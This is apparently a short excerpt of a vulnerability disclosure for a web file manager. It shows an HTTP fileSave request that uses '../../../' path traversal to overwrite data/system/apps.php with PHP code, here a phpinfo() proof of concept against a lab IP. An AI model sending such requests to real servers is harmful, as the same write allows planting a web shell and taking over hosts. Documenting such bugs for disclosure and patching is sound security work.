...
There is another way to write directly to data/system/apps.php. Overwrite the original content of apps.php. 

We test to write phpinfo into the apps.php file. 

<img width="1024" height="782" alt="image" src="https://github.com/user-attachments/assets/8e2d2eb3-ab56-4917-8cd8-402d52b09141" />

http://192.168.1.88:8088/data/system/apps.php

<img width="908" height="1267" alt="image" src="https://github.com/user-attachments/assets/dfaf49e1-2aa2-4cb8-9374-a94fbb1868aa" />
...
Cookie: KOD_SESSION_ID=1314466bdb917162b6e85d75d7912cdd; CSRF_TOKEN=1;
Connection: keep-alive

path=%7Bio%3A1%7D../../../system/apps.php&charset=utf-8&content=<?php%20phpinfo();?>&base64=0&page=1&pageNum=512000&CSRF_TOKEN=1&API_ROUTE=explorer%2Feditor%2FfileSave
